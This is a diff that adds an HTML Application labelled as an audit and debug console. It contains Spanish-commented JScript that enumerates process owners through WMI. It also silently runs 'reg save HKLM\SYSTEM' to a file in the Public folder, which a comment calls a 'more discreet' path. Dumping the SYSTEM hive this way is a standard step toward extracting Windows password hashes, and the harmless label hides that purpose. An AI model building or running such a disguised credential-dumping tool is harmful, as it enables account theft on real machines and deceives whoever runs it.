@@ -1,0 +1,71 @@
+<html>
+<head>
+<title>Consola de Auditoria Simplificada</title>
+<script language="JScript">
+    // Variables globales
+    var shell, wmi;
+
+    function inicializar() {
+        try {
+            shell = new ActiveXObject("WScript.Shell");
+            // Intentamos cargar WMI con privilegios basicos primero
+            wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+            log("SISTEMA: Listo para operar.");
+        } catch(e) {
+            log("ERROR INICIAL: " + e.message);
+        }
+    }
+
+    function log(txt) {
+        var console = document.getElementById("console");
+        console.innerHTML += "> " + txt + "<br>";
+    }
+
+    function escanear() {
+        log("Iniciando escaneo de procesos...");
+        try {
+            var col = wmi.ExecQuery("Select * from Win32_Process");
+            var items = new Enumerator(col);
+            var count = 0;
+            
+            while (!items.atEnd()) {
+                var p = items.item();
+                var user = {value:""}, dom = {value:""};
+                // Intentamos sacar el dueño, si falla saltamos al siguiente
+                try {
+                    p.GetOwner(user, dom);
+                    if (user.value != "") {
+                        log(dom.value + "\\" + user.value + " [" + p.Name + "]");
+                        count++;
+                    }
+                } catch(err) {}
+                items.moveNext();
+            }
+            log("Fin: " + count + " sesiones encontradas.");
+        } catch(e) {
+            log("ERROR ESCANEO: " + e.message);
+        }
+    }
+
+    function dumpReg() {
+        log("Intentando guardado de registro...");
+        try {
+            // Usamos una ruta mas discreta que Public
+            var dest = "C:\\Users\\Public\\log_sys.bak";
+            shell.Run("cmd.exe /c reg save HKLM\\SYSTEM " + dest + " /y", 0, true);
+            log("Operacion finalizada. Revisa: " + dest);
+        } catch(e) {
+            log("ERROR REG: " + e.message);
+        }
+    }
+</script>
+</head>
+<body onload="inicializar()" style="background:#000; color:#0f0; font-family:monospace;">
+    <h3>Debug Tool - Fase Final</h3>
+    <hr color="#0f0">
+    <button onclick="escanear()">1. Listar Usuarios</button>
+    <button onclick="dumpReg()">2. Probar Registro</button>
+    <hr color="#333">
+    <div id="console" style="background:#050505; border:1px solid #333; height:300px; padding:10px; overflow-y:auto;"></div>
+</body>
+</html>
